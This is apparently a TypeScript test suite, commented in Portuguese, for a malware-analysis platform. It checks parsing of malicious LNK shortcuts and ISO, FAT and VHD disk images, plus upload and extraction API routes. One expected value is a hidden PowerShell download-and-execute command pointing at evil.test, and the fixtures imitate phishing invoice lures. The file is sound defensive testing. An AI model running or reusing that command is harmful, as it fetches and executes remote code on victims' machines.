import { readFileSync } from 'node:fs';

import cookie from '@fastify/cookie';
import multipart from '@fastify/multipart';
import rateLimit from '@fastify/rate-limit';
import Fastify from 'fastify';

import { env } from '../../src/env';
import { hashPassword } from '../../src/lib/crypto';
import { analyzeDiskImage } from '../../src/lib/disk-image';
import { analyzeLnk, isLnk } from '../../src/lib/lnk-analysis';
import { prisma } from '../../src/lib/prisma';
import { ensureBucket } from '../../src/lib/s3';
import { analyzeBuffer } from '../../src/lib/static-analysis';
import { authRoutes } from '../../src/routes/auth';
import { entryRoutes } from '../../src/routes/entries';

const D = `${process.env.TEST_TMP}/disk`;
let fails = 0;
const ok = (label: string, cond: boolean | undefined, detail: unknown = '') => {
  if (!cond) fails++;
  console.log(`${cond ? 'ok  ' : 'FALHA'} ${label}${cond ? '' : ' ' + JSON.stringify(detail)}`);
};

async function main() {
  // 1. LNK gerado pelo pylnk3.
  const lnkBuf = readFileSync(`${D}/fatura.lnk`);
  const lnk = analyzeLnk(lnkBuf);
  ok('LNK reconhecido', isLnk(lnkBuf) && lnk !== null);
  ok(
    'destino pelo IDList',
    lnk?.target === 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
    lnk?.target,
  );
  ok(
    'argumentos, diretório, descrição e ícone',
    lnk?.arguments === ' -w hidden -nop -c "iwr http://evil.test/a.ps1 | iex"' &&
      lnk?.workingDir === 'C:\\Users\\Public' &&
      lnk?.description === 'Fatura de novembro' &&
      lnk?.iconLocation === 'C:\\Windows\\System32\\imageres.dll',
    lnk,
  );
  ok('janela minimizada e datas', lnk?.window === 'minimized' && Boolean(lnk?.created), lnk);
  ok('alertas (interpretador, URL, minimizado, ícone)', lnk?.alerts.length === 4, lnk?.alerts);
  ok('não LNK = null', analyzeLnk(Buffer.from('MZ' + 'x'.repeat(200))) === null);
  ok(
    'LNK truncado não quebra',
    analyzeLnk(lnkBuf.subarray(0, 100)) === null ||
      typeof analyzeLnk(lnkBuf.subarray(0, 100)) === 'object',
  );

  // 2. Imagens geradas por xorriso e mkfs.fat.
  const iso = analyzeDiskImage(readFileSync(`${D}/pedido.iso`));
  ok('ISO 9660 com Joliet', iso?.format === 'iso9660' && iso.label === 'PEDIDO_2026', iso?.label);
  ok(
    'nomes longos e acentos (Joliet)',
    iso?.files.some((f) => f.path === 'docs/Relatórios/boleto-novembro-2026.pdf'),
    iso?.files.map((f) => f.path),
  );
  ok(
    'alerta de executável na ISO',
    iso?.alerts[0]?.startsWith('2 arquivo(s) executável(is)'),
    iso?.alerts,
  );
  const fat = analyzeDiskImage(readFileSync(`${D}/fat.img`));
  ok('FAT16 com rótulo', fat?.format === 'fat' && fat.label === 'FATURAS');
  ok(
    'nome longo (VFAT), pasta e oculto',
    fat?.files.some((f) => f.path === 'fatura_documento_longo_nome.exe') &&
      fat.files.some((f) => f.path === 'Pasta/LEIA-ME.TXT') &&
      fat.files.find((f) => f.path === 'OCULTO.DLL')?.hidden === true,
    fat?.files,
  );
  ok(
    'FAT32',
    analyzeDiskImage(readFileSync(`${D}/fat32.img`))?.files[0]?.path === 'arquivo_em_fat32.txt',
  );
  const vhd = analyzeDiskImage(readFileSync(`${D}/disk.vhd`));
  ok('VHD fixo com MBR e FAT', vhd?.format === 'vhd-fat' && vhd.files.length === 3, vhd?.format);
  const vhdx = analyzeDiskImage(Buffer.concat([Buffer.from('vhdxfile'), Buffer.alloc(100)]));
  ok(
    'VHDX reconhecido, não listado',
    vhdx?.format === 'unsupported' && vhdx.note?.startsWith('VHDX'),
  );
  ok('texto não é imagem', analyzeDiskImage(Buffer.from('texto qualquer '.repeat(100))) === null);
  ok(
    'ISO truncada não quebra',
    (() => {
      try {
        analyzeDiskImage(readFileSync(`${D}/pedido.iso`).subarray(0, 0x8800));
        return true;
      } catch {
        return false;
      }
    })(),
  );

  // 3. Na analise estatica.
  ok(
    'análise estática traz o LNK',
    analyzeBuffer(lnkBuf, 'fatura.pdf.lnk').lnk?.window === 'minimized',
  );
  const stIso = analyzeBuffer(readFileSync(`${D}/pedido.iso`), 'pedido.iso');
  ok(
    'análise estática traz a imagem (sem os deslocamentos)',
    stIso.diskImage?.files.length === 4 && !('extent' in (stIso.diskImage?.files[0] ?? {})),
    stIso.diskImage?.files[0],
  );
  ok(
    'URL do LNK sugerida',
    analyzeBuffer(lnkBuf, 'x.lnk').iocCandidates.some((c) => c.value === 'evil.test'),
  );

  // 4. Envio, extracao e filhas.
  env.CLAMAV_HOST = '';
  env.UPLOAD_DAILY_LIMIT = 0;
  await ensureBucket();
  const app = Fastify();
  await app.register(cookie, { secret: env.SESSION_SECRET });
  await app.register(rateLimit, { global: false });
  await app.register(multipart, { limits: { fileSize: 100 * 1024 * 1024, files: 1 } });
  for (const r of [authRoutes, entryRoutes]) await app.register(r);
  await app.ready();
  for (const [email, role] of [
    ['ana@x.io', 'ANALYST'],
    ['bob@x.io', 'USER'],
  ] as const) {
    await prisma.user.create({
      data: {
        email,
        displayName: email.split('@')[0],
        role,
        passwordHash: await hashPassword('senha-123!'),
      },
    });
  }
  const login = async (email: string) =>
    String(
      (
        await app.inject({
          method: 'POST',
          url: '/api/auth/login',
          payload: { email, password: 'senha-123!' },
        })
      ).headers['set-cookie'],
    ).split(';')[0];
  const cAna = await login('ana@x.io');
  const cBob = await login('bob@x.io');
  const upload = async (name: string, data: Buffer, c: string) => {
    const boundary = '----dl' + Math.random();
    const body = Buffer.concat([
      Buffer.from(
        `--${boundary}\r\nContent-Disposition: form-data; name="tags"\r\n\r\nphishing\r\n`,
      ),
      Buffer.from(
        `--${boundary}\r\nContent-Disposition: form-data; name="file"; filename="${name}"\r\nContent-Type: application/octet-stream\r\n\r\n`,
      ),
      data,
      Buffer.from(`\r\n--${boundary}--\r\n`),
    ]);
    const r = await app.inject({
      method: 'POST',
      url: '/api/entries/file',
      payload: body,
      headers: { cookie: c, 'content-type': `multipart/form-data; boundary=${boundary}` },
    });
    return r.json().entry as { id: string; ownerId: string };
  };
  const isoEntry = await upload('pedido.iso', readFileSync(`${D}/pedido.iso`), cBob);
  const detail = (
    await app.inject({
      method: 'GET',
      url: `/api/entries/${isoEntry.id}`,
      headers: { cookie: cBob },
    })
  ).json().entry;
  ok('envio grava a imagem', detail.staticInfo?.diskImage?.format === 'iso9660');
  ok(
    'usuário comum não extrai',
    (
      await app.inject({
        method: 'POST',
        url: `/api/entries/${isoEntry.id}/extract-image`,
        headers: { cookie: cBob },
      })
    ).statusCode === 403,
  );
  let r = await app.inject({
    method: 'POST',
    url: `/api/entries/${isoEntry.id}/extract-image`,
    headers: { cookie: cAna },
  });
  ok(
    'extrai os 4 arquivos',
    r.statusCode === 200 && r.json().created === 4 && r.json().skipped.length === 0,
    r.json(),
  );
  const kids = await prisma.entry.findMany({
    where: { parentEntryId: isoEntry.id },
    include: { tags: true },
  });
  const exe = kids.find((k) => k.originalFilename === 'fatura_documento.exe');
  ok(
    'filha com dono, tags e análise',
    exe?.ownerId === isoEntry.ownerId &&
      exe?.tags[0]?.name === 'phishing' &&
      exe?.title === 'fatura_documento.exe' &&
      Boolean(exe?.sha256),
    exe,
  );
  ok(
    'caminho completo no título',
    kids.some((k) => k.title === 'docs/Relatórios/boleto-novembro-2026.pdf'),
  );
  r = await app.inject({
    method: 'GET',
    url: `/api/entries/${isoEntry.id}/children`,
    headers: { cookie: cBob },
  });
  ok('lista as filhas', r.json().children.length === 4);
  ok(
    'segunda extração = 409',
    (
      await app.inject({
        method: 'POST',
        url: `/api/entries/${isoEntry.id}/extract-image`,
        headers: { cookie: cAna },
      })
    ).statusCode === 409,
  );
  const ev = await prisma.entryEvent.findFirst({
    where: { entryId: isoEntry.id, type: 'FILES_EXTRACTED' },
  });
  ok('histórico da extração', ev?.detail === '4 arquivo(s)');
  const notImage = await upload('nota.txt', Buffer.from('apenas texto'), cAna);
  ok(
    'não imagem = 400',
    (
      await app.inject({
        method: 'POST',
        url: `/api/entries/${notImage.id}/extract-image`,
        headers: { cookie: cAna },
      })
    ).statusCode === 400,
  );
  const vhdEntry = await upload('disco.vhd', readFileSync(`${D}/disk.vhd`), cAna);
  r = await app.inject({
    method: 'POST',
    url: `/api/entries/${vhdEntry.id}/extract-image`,
    headers: { cookie: cAna },
  });
  ok('extrai do VHD (FAT)', r.json().created === 3, r.json());
  await prisma.entry.update({
    where: { id: notImage.id },
    data: { filePurgedAt: new Date(), storageKey: null },
  });
  ok(
    'expurgado = 410',
    (
      await app.inject({
        method: 'POST',
        url: `/api/entries/${notImage.id}/extract-image`,
        headers: { cookie: cAna },
      })
    ).statusCode === 410,
  );

  await app.close();
  await prisma.$disconnect();
  console.log(fails ? `\n${fails} falha(s)` : '\ntudo ok');
  process.exit(fails ? 1 : 0);
}
main();
